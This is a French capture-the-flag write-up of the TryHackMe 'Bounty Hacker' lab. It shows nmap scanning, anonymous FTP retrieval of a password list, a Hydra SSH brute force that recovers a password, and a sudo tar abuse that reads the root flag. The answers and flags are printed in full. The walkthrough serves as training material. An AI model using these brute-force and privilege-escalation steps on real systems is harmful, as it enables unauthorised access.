# Bounty Hacker #
## Task 1 Living up to the title. ##

**Deploy the machine.**
Cliquez sur Start Machine.  

**Find open ports on the machine**
```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.226.135 bountyhacker.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A bountyhacker.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-30 20:56 CEST
Nmap scan report for bountyhacker.thm (10.10.226.135)
Host is up (0.033s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.228.66
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Linux 5.1 (90%), Linux 5.4 (90%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%), Infomir MAG-250 set-top box (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 20/tcp)
HOP RTT      ADDRESS
1   33.49 ms 10.9.0.1
2   33.71 ms bountyhacker.thm (10.10.226.135)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.41 seconds

```

Les informations de nmap nous montre plusieurs services :   
Le service FTP sur le port 21, le scan nous montre que le mode anonymous fonctionne.   
Le service SSH sur le port 22.   
Le service HTTP sur le port 80.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ftp bountyhacker.thm
Connected to bountyhacker.thm.
220 (vsFTPd 3.0.3)
Name (bountyhacker.thm:tim): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.06 secs (6.6576 kB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.07 secs (0.9703 kB/s)
ftp> exit
221 Goodbye.

```

Who wrote the task list?   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Dans la fichier task.txt on a le nom du rédacteur.  
Réponse : lin  


```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

Le deuxième fichier est une liste de mot de passe.   

**What service can you bruteforce with the text file found?**

Le service ssh peut être brute forcé.   

**What is the users password?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ hydra -l lin -P ./locks.txt ssh://bountyhacker.thm -t 4
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-30 21:12:44
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://bountyhacker.thm:22/
[22][ssh] host: bountyhacker.thm   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-30 21:13:01
```

Avec hydra on trouve le bon mot de passe.   
La réponse est : RedDr4gonSynd1cat3  

**user.txt**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh lin@bountyhacker.thm
lin@bountyhacker.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}

```
Une fois connecté on on lit le flag.   
La réponse est : THM{CR1M3_SyNd1C4T3}    

**root.txt**

```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

La configuration de sudo nous permet d'utiliser tar sans mot de passe.   

```bash
lin@bountyhacker:~/Desktop$ sudo /bin/tar -cvf reponse.tar /root/root.txt 
/bin/tar: Removing leading `/' from member names
/root/root.txt

lin@bountyhacker:~/Desktop$ tar -xvf reponse.tar 
root/root.txt

lin@bountyhacker:~/Desktop$ cat ./root/root.txt 
THM{80UN7Y_h4cK3r}
```

Avec tar on créée une archive qui contient root.txt.    
On récupère le fichier root.txt.   
On le lit.   

La réponse est : THM{80UN7Y_h4cK3r}     